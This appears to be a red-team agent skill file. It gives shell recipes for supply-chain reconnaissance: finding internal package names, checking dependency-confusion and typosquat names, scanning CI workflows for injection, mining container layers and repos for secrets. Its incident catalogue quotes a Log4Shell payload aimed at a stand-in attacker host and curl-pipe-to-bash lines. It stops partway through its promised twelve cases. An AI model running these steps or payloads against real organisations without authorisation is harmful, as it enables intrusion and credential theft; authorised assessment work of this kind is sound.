---
name: supply-chain-attack-recon
description: External recon for software supply-chain attack surface — package-namespace squatting candidates, dependency-confusion vulnerabilities, GitHub Actions injection openings, container image registry exposure, SBOM mining, internal-package-name leakage, and CI/CD configuration exposure. Reconnaissance and identification ONLY — actual package publishing / typosquat attacks are EXTERNAL-OFFENSIVE and require explicit written sign-off because they can affect the entire npm/PyPI ecosystem. Use when the target has a public GitHub org, when their build artifacts/SBOMs are reachable, when their docker images are on Docker Hub/GHCR, or when you find internal package names in their JS bundles.
sources: alex-birsan-dependency-confusion, supply-chain-research, github-actions-security, cisa-advisories, mandiant-tag, github-security-blog, snyk-research
report_count: 12
---

## When to use

Trigger when:
- Target has a public GitHub organization (find via OSINT)
- JS bundles reference internal-looking package names (`@target-internal/...`, `target-utils`, `target-shared`)
- Build logs, SBOMs, or `package-lock.json` files are publicly accessible
- Target uses CI/CD that's partially public (GitHub Actions, GitLab CI, Bitrise)
- Docker images on Docker Hub/GHCR/Quay belong to target org
- Findings include `npmrc`/`pip.conf`/`gradle.properties` with internal registry URLs
- `.github/workflows/*.yml` files reference internal tooling

Do NOT use for:
- Internal-network artifact registries (out of scope per external boundary)
- Actually publishing typosquats / dep-confusion packages without explicit OK
- Compromising upstream open-source projects (massive blast radius — illegal in most jurisdictions without authorization)

---

## The supply-chain attack surface map

```
Target Org
├── Public GitHub Org → workflow files → secrets exfil opportunities
├── Internal package names in JS/Android bundles → dependency confusion
├── Docker images on public registries → secrets in layers, RCE on pull
├── SBOM / artifact metadata → exact dep versions for known-vuln chaining
├── npmrc / pip.conf in repos → internal registry URL disclosure
├── External package dependencies → typosquat name candidates
└── Build/release pipelines → injection if pull_request_target etc.
```

---

## Step 1 — GitHub org discovery

```bash
TARGET="<brand>"  # set to target brand name

# Direct guesses
for guess in $TARGET "${TARGET}-tech" "${TARGET}corp" "${TARGET}-io" "${TARGET}-eng"; do
  curl -sI "https://github.com/$guess" | grep -E "HTTP|status" | head -1
done

# Via WHOIS / email-domain → GitHub search
gh search users --owner-affiliations=organization --query "$TARGET" --limit 10

# Via employees → reverse from social media + GitHub profile
# Many employees list their employer org on their GitHub profile
```

---

## Step 2 — Enumerate public repos for sensitive artifacts

```bash
ORG="targetorg"

# List public repos
gh repo list "$ORG" --limit 100 --json name,description,visibility,defaultBranchRef

# Look for high-signal repo names
gh repo list "$ORG" --limit 100 --json name | jq -r '.[].name' | grep -iE "internal|infra|deploy|config|secret|setup|sdk|api"

# Clone all (small org) or selectively
gh repo clone "$ORG/$repo_name"
```

---

## Step 3 — Internal package-name discovery

### From JS bundles

```bash
# JS bundles are the easiest source of internal npm names
curl -sk https://target.com/main.js | grep -oE '@[a-z-]+/[a-z-]+' | sort -u
curl -sk https://target.com/main.js | grep -oE 'require\("[^"]+"\)' | sort -u

# Look for scoped names that are NOT public on npm
for pkg in @target/utils @target-internal/api @companybrand/sdk; do
  status=$(curl -sI "https://registry.npmjs.org/$pkg" | head -1 | awk '{print $2}')
  echo "  $pkg → $status"
  # 404 → name unclaimed on public npm → DEPENDENCY-CONFUSION CANDIDATE
done
```

### From GitHub repo package.json files

```bash
# Public repos with package.json that reference internal scopes
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  pkg=$(gh api "repos/$ORG/$repo/contents/package.json" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null)
  echo "$pkg" | jq -r '.dependencies // {} | keys[]' 2>/dev/null | grep -E '^@[a-z-]+/'
done | sort -u
```

### From Python projects

```bash
# Internal pip package names
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  gh api "repos/$ORG/$repo/contents/requirements.txt" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null
done | sort -u | grep -vE '^(requests|django|flask|numpy|pandas|...common)'
```

---

## Step 4 — Dependency-confusion vulnerability check

For each internal-looking package name discovered:

```bash
NAME="@target-internal/utils"   # example

# npm check
curl -sI "https://registry.npmjs.org/$NAME" | head -1
# 404 → name is registerable → DEPENDENCY-CONFUSION POSSIBLE

# pypi check (no scopes, just name)
NAME="target_utils"
curl -sI "https://pypi.org/project/$NAME/" | head -1
# 404 → name is registerable

# rubygems
curl -sI "https://rubygems.org/api/v1/gems/$NAME.json" | head -1

# Go modules — slightly different, since module names are URLs
# Check if module path is reachable
curl -sI "https://proxy.golang.org/github.com/$ORG/$NAME/@latest" | head -1
```

**Severity calibration:** Just because a name is unclaimed doesn't mean it's exploitable. You also need:
1. Evidence the target's BUILD SYSTEM resolves names from public registries (not just their internal one)
2. OR evidence the target's package manager is configured insecurely (e.g., `.npmrc` without `@scope:registry=` mapping)
3. OR the package would be installed by their builds (it's actually in package.json, not just referenced in dead code)

A 404 on registry without supporting context is INFORMATIONAL only.

---

## Step 5 — Typosquat candidates (around external dependencies)

For each external public dependency the target uses:

```bash
# Common typosquat patterns:
# Original: "react-router-dom"
# Typos: 
#   "react-router-doms" (extra s)
#   "react-routter-dom" (double t)
#   "react-rotuer-dom" (transposed)
#   "react--router-dom" (double dash)
#   "react-router-dorn" (m→rn)
#   "reactrouterdom" (no dashes)

# Generate candidates
python3 -c "
import sys
name='react-router-dom'
for i in range(len(name)):
    print(name[:i] + name[i+1:])   # delete
    if i < len(name)-1:
        print(name[:i] + name[i+1] + name[i] + name[i+2:])  # transpose
"

# Check which candidates are UNCLAIMED on the registry
for candidate in ...; do
  status=$(curl -sI "https://registry.npmjs.org/$candidate" | head -1 | awk '{print $2}')
  [ "$status" = "404" ] && echo "  UNCLAIMED: $candidate"
done
```

**⚠ EXTERNAL-OFFENSIVE NOTE:** publishing a typosquat package to a public registry is an attack on the wider ecosystem. NEVER do this without explicit, written, scope-clarified sign-off. It can affect users outside your engagement and may be illegal.

---

## Step 6 — GitHub Actions workflow injection scan

For each public repo with `.github/workflows/`:

```bash
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  workflows=$(gh api "repos/$ORG/$repo/contents/.github/workflows" --jq '.[].name' 2>/dev/null)
  for wf in $workflows; do
    content=$(gh api "repos/$ORG/$repo/contents/.github/workflows/$wf" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null)
    echo "=== $repo/$wf ==="
    
    # High-risk patterns:
    # 1. pull_request_target (runs with secrets on PR from forks)
    echo "$content" | grep -E 'pull_request_target'
    
    # 2. Untrusted context interpolation
    echo "$content" | grep -E '\$\{\{[^}]*github\.(event|head_ref|pull_request)[^}]*\}\}'
    
    # 3. ${{ github.event.* }} into shell run blocks
    echo "$content" | grep -B1 -A2 'run:' | grep -E '\$\{\{ ?github\.event\.'
    
    # 4. checkout of PR head with elevated perms
    echo "$content" | grep -E 'ref:.*pull_request|head_ref'
    
    # 5. Self-hosted runner without isolation
    echo "$content" | grep -E 'runs-on:.*self-hosted'

    # 6. Unpinned third-party actions — mutable tag (@v1, @main) vs pinned (@<40-char sha>)
    #    Mutable tags can be repointed by a compromised action repo (see case #9, tj-actions/changed-files).
    echo "$content" | grep -E 'uses: *[^ ]+/[^ ]+@(v?[0-9]+([.][0-9]+)*|main|master|latest)\b' | grep -v '@[0-9a-f]\{40\}'
  done
done
```

### Injection patterns to flag (severity guide)

| Pattern | Severity |
|---|---|
| `pull_request_target` + `actions/checkout` with `ref: pull_request.head.sha` + uses repo secrets | **Critical** — RCE on runner with org secrets |
| `${{ github.event.pull_request.title }}` interpolated into shell | **Critical** — script injection via PR title |
| Third-party action pinned to a mutable tag (`uses: org/repo@v1` / `@main`) instead of a commit SHA | **High** — repointable supply-chain vector (see case #9) |
| Self-hosted runner reachable from public repo workflows | **High** — persistent attacker pivot |
| Issue-comment-triggered workflow that runs `gh` with token | **High** |
| Workflow downloads from URL that target controls | **Medium** |

---

## Step 7 — Docker / container image registry mining

```bash
# Docker Hub
curl -s "https://hub.docker.com/v2/repositories/$ORG/?page_size=100" | jq -r '.results[].name'

# GHCR (GitHub Container Registry) — public images visible in repo packages tab
gh api "users/$ORG/packages?package_type=container" 2>/dev/null
gh api "orgs/$ORG/packages?package_type=container" 2>/dev/null

# For each image, list tags
for img in image1 image2; do
  curl -s "https://hub.docker.com/v2/repositories/$ORG/$img/tags?page_size=20" | jq -r '.results[].name'
done

# Pull and inspect layers
docker pull "$ORG/$img:latest"
docker history --no-trunc "$ORG/$img:latest"

# Mine layers for secrets
docker save "$ORG/$img:latest" -o /tmp/image.tar
mkdir -p /tmp/img && tar -xf /tmp/image.tar -C /tmp/img
find /tmp/img -name "*.tar*" -exec tar -xf {} -C /tmp/img/extracted \;
# Then run gitleaks / trufflehog over extracted filesystem
trufflehog filesystem /tmp/img/extracted --no-update
```

---

## Step 8 — SBOM / artifact metadata leakage

```bash
# Look for SBOMs published as releases (SPDX, CycloneDX format)
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("sbom|cyclonedx|spdx"; "i")) | .browser_download_url'

# JSON dependency lockfiles in releases
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("lock|deps"; "i")) | .browser_download_url'

# Exact-version-pinned deps → known-CVE chaining
# Compare versions to nuclei nvd templates or osv.dev for known vulns
curl -s "https://api.osv.dev/v1/query" -d '{"package": {"name": "lodash", "ecosystem": "npm"}, "version": "4.17.10"}'
```

---

## Step 9 — Internal registry URL leakage

```bash
# .npmrc patterns
grep -r "registry=" .                                            # in cloned repos
grep -r "_authToken=" .                                          # leaked npm token!
grep -r "@.*registry=" .                                          # scoped registry

# pip config
grep -r "extra-index-url" .
grep -r "index-url" .

# Gradle / Maven
grep -rE "(mavenCentral|maven\s*\{)" .
grep -r "url.*\(.*nexus" .

# Each leaked internal URL is intel — flag the URL itself even if not directly exploitable
```

---

## Step 10 — npm/PyPI organizational presence

```bash
# Some orgs maintain a public npm scope mirroring their brand
curl -s "https://registry.npmjs.org/-/v1/search?text=scope:$ORG&size=50" | jq '.objects[].package.name'

# Public PyPI presence
curl -s "https://pypi.org/simple/" | grep "$ORG" | head -20

# Check if scope is taken — if it's NOT, an attacker could register
# (relevant for any internal package using that scope)
curl -sI "https://registry.npmjs.org/-/org/$ORG"
```

---

## Tooling

| Tool | Purpose |
|---|---|
| **`trufflehog`** | Filesystem/git/docker secret scan |
| **`gitleaks`** | Git history secret scan |
| **`dependency-confusion`** (Confused) | npm scope/PyPI checks |
| **`packj`** | Package risk score (PyPI/npm/RubyGems) |
| **`Lift / Snyk vuln-db`** | Known CVE lookup by package version |
| **`actionlint`** | GitHub Actions static analyzer |
| **`OSSGadget`** | Microsoft's package metadata toolkit |
| **`semgrep`** + supply-chain rules | Workflow injection detection |
| **`osv-scanner`** | Match versions to known vulns |

---

## Severity scoring guidance

| Finding | Severity |
|---|---|
| Internal package name + no scope-mapping + unclaimed on public npm + actively in builds | **Critical** — Dep-confusion RCE |
| Internal package name + scope-mapping in `.npmrc` but `_authToken` leaked | **Critical** — direct registry push |
| Pull_request_target workflow + secrets exposed + PR-controlled code execution | **Critical** — Org-wide token theft |
| Docker image with leaked secret in layer | **High** (varies by secret) |
| Internal registry URL disclosed (but no creds) | **Low** — Info-disc only |
| Typosquat candidate identified (not published) | **Informational** — Awareness item |
| Public org has 1000+ unused names that COULD be claimed | **Informational** — Hygiene |

---

## Anti-patterns

- **DO NOT publish a typosquat / dep-confusion package without explicit, signed, scope-clarified authorization** — this affects users outside the engagement
- **DO NOT submit PRs to client repos as part of testing without specific OK** — workflow injection PoCs may be needed but they touch CI/CD and other developers
- **DO NOT scrape entire npm/PyPI for typosquat candidates** — irresponsible and noisy
- **DO NOT confuse "name is unclaimed" with "exploitable dependency confusion"** — the build system matters; many orgs use proper scope-mapping that prevents the attack
- **DO NOT touch GitHub Actions self-hosted runners** — they may be inside the client network and outside the external scope
- **DO NOT pull large Docker images blindly** — image bandwidth can be 5-50GB; review tags first

---

## What constitutes a deliverable finding

A supply-chain finding needs ALL of:
1. **Concrete name/path** — exact internal package name, exact workflow file path, exact image tag
2. **Vulnerability mechanism** — dep-confusion / typosquat / injection / etc.
3. **Exploitability evidence** — proof the build/install would actually use the attacker's payload (not just "name is unclaimed")
4. **Severity** — calibrated to blast radius (one developer? all developers? all users of the package?)
5. **Recommendation** — specific (e.g., "register the unused name @target-internal/utils on npm AS YOUR OWN even if unused; configure `.npmrc` scope:registry mapping")

---

## Bridge to neighboring skills

- `apk-redteam-pipeline` — APKs reveal internal package names too (find them in decompiled `build.gradle`)
- `cloud-iam-deep` — CI/CD secrets often = cloud credentials; this skill finds them, that skill validates them
- `hunt-cloud-misconfig` — CI/CD pipeline misconfig (Jenkins / GitLab Runner) overlap
- `m365-entra-attack` — Azure DevOps pipelines are part of Entra surface
- `redteam-report-template` — supply-chain findings need extra clarity on blast radius (one repo vs whole ecosystem)
- `mid-engagement-ir-detection` — registering a name on public npm triggers nothing inside the client, but ANY publish action is loud and audit-trailed

---

## External-only boundary check

This skill is squarely external — all targets are public registries / public GitHub. If the engagement involves the client's internal artifact registry (internal Nexus, JFrog, Sonatype), that is internal infrastructure and OUT OF SCOPE per `feedback_skill_boundaries`. Report internal-registry URL exposure as a finding; do not attempt to enumerate it.

---

## Real-world references

- **Alex Birsan 2021** — Original dependency-confusion research, $130K+ in bounties from Apple/Microsoft/PayPal/Yelp/etc.
- **ua-parser-js 2021** — npm package compromise via stolen maintainer credentials
- **node-ipc 2022** — Maintainer-introduced supply-chain malicious update
- **3CX 2023** — Cascading supply-chain attack via X_TRADER → 3CX → customers
- **XZ Utils 2024** — Multi-year social-engineering supply-chain attack on upstream OSS

Each of these is worth reading for what made the attack effective and what red flags existed earlier.

---

## Disclosed-case catalogue (citations)

Twelve well-documented public cases, mapped to the recon surface above. Each entry: attack name, year, flow, root cause, impact, references, and the recon-skill takeaway.

### 1. SolarWinds Orion / SUNBURST (CISA AA20-352A, Dec 2020)

- **Flow:** APT29 (UNC2452 / Cozy Bear) breached SolarWinds' build pipeline and inserted the SUNBURST backdoor into `SolarWinds.Orion.Core.BusinessLayer.dll`. The trojanized DLL was code-signed with SolarWinds' legitimate certificate and shipped to ~18,000 customers via the normal auto-update channel between March and June 2020.
- **Root cause:** Build-environment compromise — attackers modified source mid-compilation; signing infrastructure trusted the build output without verifying source integrity.
- **Impact:** ~18,000 organisations received the backdoor; ~100 (incl. US Treasury, Commerce, DHS, DoJ, Microsoft, FireEye/Mandiant) received the SECOND-stage TEARDROP/BEACON payload. SolarWinds reported >$40M in direct response costs; class-action settlement $26M.
- **References:**
  - CISA AA20-352A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a
  - Mandiant write-up (SUNBURST): https://cloud.google.com/blog/topics/threat-intelligence/sunburst-additional-technical-details
  - Microsoft analysis: https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack/
  - SolarWinds post-mortem: https://orangematter.solarwinds.com/2021/01/11/new-findings-from-our-investigation-of-sunburst/
- **Recon takeaway:** Whenever a target ships signed binaries from their own CI, the recon check is: is the build environment itself reachable? Look for exposed Jenkins/GitLab CI consoles, public TeamCity agents, or build artefacts that leak source paths. A code-signing cert plus a compromised build = unstoppable trust chain.

### 2. 3CX VoIP softphone supply chain (CVE-2023-29059, March 2023)

- **Flow:** DPRK-attributed Lazarus subgroup (UNC4736 / Labyrinth Chollima) trojanized the 3CX DesktopApp (Electron-based softphone) on both Windows and macOS. Initial entry was via a PREVIOUS supply-chain attack — an employee installed a backdoored copy of Trading Technologies' X_TRADER, the FIRST disclosed cascading supply-chain compromise (one supply-chain victim becomes another's vector).
- **Root cause:** Dev workstation compromise → access to 3CX source/build pipeline → malicious `ffmpeg.dll` and `d3dcompiler_47.dll` shipped in signed installer.
- **Impact:** ~600,000 organisations use 3CX; tens of thousands of trojanized clients downloaded. Lazarus selectively activated second-stage payloads against cryptocurrency and trading firms.
- **References:**
  - CrowdStrike: https://www.crowdstrike.com/en-us/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/
  - SentinelOne: https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/
  - Mandiant cascading attack analysis: https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise
  - 3CX post-mortem: https://www.3cx.com/blog/news/desktopapp-security-alert-update/
- **Recon takeaway:** Cascading supply chain is real — your target's vendors' vendors matter. When recon enumerates "what software does this org install on engineer laptops," each one is itself a supply-chain target. Electron apps (signed JS bundles) are especially common vectors.

### 3. MOVEit Transfer mass exploitation (CVE-2023-34362, May–July 2023)

- **Flow:** Cl0p ransomware affiliate (FIN11 / Lace Tempest) discovered an unauthenticated SQLi in Progress MOVEit Transfer, deployed the LEMURLOOT webshell, and exfiltrated files from every internet-reachable instance over a ~2-week window before the patch dropped on 31 May 2023.
- **Root cause:** Pre-auth SQLi in `moveitisapi/moveitisapi.dll` → arbitrary SQL → write webshell via `xp_cmdshell`-equivalent path. Classic single-CVE-mass-exploitation; not a build-pipeline attack but a SHIPPED-CODE supply-chain failure.
- **Impact:** ~2,700 organisations confirmed compromised, ~95 million individuals' PII leaked (BBC, Shell, BA, US DoE, Louisiana OMV, Oregon DMV, etc.). Estimated losses >$15B aggregated.
- **References:**
  - CISA AA23-158A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a
  - Progress advisory: https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023
  - Mandiant: https://cloud.google.com/blog/topics/threat-intelligence/zero-day-moveit-data-theft
  - Huntress technical breakdown: https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response
- **Recon takeaway:** Vendor file-transfer products (MOVEit, Accellion FTA, GoAnywhere MFT, Cleo Harmony) are the recurring "internet edge, holds everyone's data, runs on Windows" pattern. Always fingerprint by HTML title / favicon hash early in recon; a single edge-product CVE = entire customer base.

### 4. Codecov bash uploader compromise (Apr 2021)

- **Flow:** Attackers gained access to Codecov's Docker image build process via a credential mistake in the image-creation flow, then modified the `Bash Uploader` script (`https://codecov.io/bash`) to exfiltrate environment variables to a third-party IP. The modification persisted from 31 Jan 2021 to 1 Apr 2021 — two months before detection by a customer who noticed an SHA-256 mismatch.
- **Root cause:** Docker image build leaked a credential allowing modification of the served bash script; no integrity verification (no signed pinned hash) on the customer side.
- **Impact:** Every CI run worldwide that piped `curl -s https://codecov.io/bash | bash` for 2 months exfiltrated env vars. Confirmed downstream victims: HashiCorp (rotated GPG key), Twilio, Rapid7 (source-code partial exposure), Mercari, Confluent, Atlassian.
- **References:**
  - Codecov post-mortem: https://about.codecov.io/security-update/
  - HashiCorp advisory: https://discuss.hashicorp.com/t/hcsec-2021-12-codecov-security-event-and-hashicorp-gpg-key-exposure/23512
  - Mercari disclosure: https://about.mercari.com/en/press/news/articles/20210521_incidentreport/
  - Rapid7: https://www.rapid7.com/blog/post/2021/05/13/rapid7-discloses-its-response-to-codecov-incident/
- **Recon takeaway:** "Curl-bash-install" patterns in public CI workflows are gold for this recon skill — search `.github/workflows/` for `curl ... | bash`, `wget ... | sh`, `iwr ... | iex`. Any third-party URL fed into a shell is a supply-chain blast radius. Pinned SHAs in workflows mitigate; absence of pinning = finding.

### 5. ua-parser-js npm hijack (Oct 2021)

- **Flow:** Attacker phished/credential-stuffed the maintainer's npm account and published `0.7.29`, `0.8.0`, and `1.0.0` of `ua-parser-js` (≈7M weekly downloads, transitively reaching Facebook, Microsoft, Amazon, IBM). The malicious versions ran a `preinstall` hook that downloaded a cryptominer + Windows password-stealer (Jason credential stealer).
- **Root cause:** Maintainer npm account had no 2FA / weak credentials; npm did not enforce 2FA for high-value publishers at the time.
- **Impact:** Packages live ~4 hours before takedown but tens of thousands of installs in that window. CISA issued an emergency alert — the first time CISA had ever warned on an npm-package compromise.
- **References:**
  - GitHub Security advisory: https://github.com/advisories/GHSA-pjwm-rvh2-c87w
  - CISA alert: https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js
  - Maintainer's incident note: https://github.com/faisalman/ua-parser-js/issues/536
  - Snyk analysis: https://snyk.io/blog/npm-security-malicious-code-found-in-npm-package-ua-parser-js/
- **Recon takeaway:** Identify your target's top-30 npm/PyPI maintainers by package download count, then check whether their accounts have 2FA enabled (npm exposes this via `npm profile get` on org members, partially public via the registry API). Recon output: "these 4 maintainers control packages with X installs and have no 2FA per public registry data."

### 6. event-stream npm package (Nov 2018)

- **Flow:** Original maintainer Dominic Tarr (no longer using the module) handed `event-stream` (≈2M weekly downloads) to a new contributor named "right9ctrl" who'd offered to maintain it. The new maintainer added `flatmap-stream` as a dependency, then pushed an update to `flatmap-stream` containing payload targeting the Copay bitcoin wallet's build — stole BTC/BCH wallet seeds from any Copay user.
- **Root cause:** Social engineering of a maintenance-handover; no review of new contributors taking over critical packages. The malicious dep was only triggered when `event-stream` was bundled into the Copay wallet (build-context targeting).
- **Impact:** Copay wallet users had keys stolen; exact dollar damage never disclosed publicly. Triggered the npm-wide 2FA push and "popular packages need additional review" policy.
- **References:**
  - GitHub Security advisory: https://github.com/advisories/GHSA-mh6f-8j2x-4483
  - npm post-mortem: https://github.blog/2018-11-26-npm-package-event-stream/
  - Original disclosure thread: https://github.com/dominictarr/event-stream/issues/116
  - Snyk write-up: https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/
- **Recon takeaway:** Check `npm view <pkg> maintainers` and recent maintainer changes for packages your target depends on. A maintainer change in the past 90 days on a 100K+ download package is a yellow flag. Also: payload-targeting-by-build-context (only fires when bundled into specific app) is HARD to detect — static scanners miss it.

### 7. PHP Git server compromise (March 2021)

- **Flow:** Attackers pushed two malicious commits to the official `php-src` git repository on `git.php.net`, signed as Rasmus Lerdorf and Nikita Popov. The commits added a Zend backdoor that executed code from the `User-Agentt` HTTP header (note double-t).
- **Root cause:** Self-hosted git server (Gitolite-based `git.php.net`) had a credential / authentication flaw — possibly password-stored-in-plain in a user database leak. PHP team migrated to GitHub as canonical source after this incident.
- **Impact:** Backdoor commits caught within hours, never shipped in a release. But this is the canonical case of "self-hosted source-of-truth = single point of failure."
- **References:**
  - PHP.net post-mortem: https://news-web.php.net/php.internals/113838
  - Nikita Popov's analysis: https://externals.io/message/113848
  - ZDNet coverage: https://www.zdnet.com/article/php-internal-git-server-hacked-with-malicious-code-pushed-to-the-php-src-repo/
- **Recon takeaway:** Targets running self-hosted git (Gitea, Gitolite, Phabricator, Bitbucket Server) are higher-risk than GitHub-hosted. Recon should fingerprint git-server software, check for default creds, and watch for SSH-key-based pushes from unexpected IPs (visible in commit metadata).

### 8. Log4Shell (CVE-2021-44228, Dec 2021)

- **Flow:** Not a supply-chain ATTACK per se, but the canonical "you don't know what's in your dependency tree" event. A JNDI lookup feature in Apache Log4j 2.x allowed remote code execution via `${jndi:ldap://attacker/...}` in any logged string. Because Log4j is transitively pulled by thousands of Java apps, hundreds of millions of systems were vulnerable.
- **Root cause:** Unsafe-by-default feature shipped in 2013 (`MessageLookup` substitution); deeply nested transitive dependency made inventory and patching almost impossible.
- **Impact:** "Most critical vulnerability in a decade" per CISA Director Jen Easterly. Affected every major cloud, every Apache product, every Java enterprise stack. Ongoing mass exploitation by Conti, Khonsari ransomware, state actors.
- **References:**

## Extended Content

This page only contains the core methodology. Extended reference content (payloads, full tables, detailed examples) has been moved to [`references/`](references/supply-chain-attack-recon-reference.md) for size management.

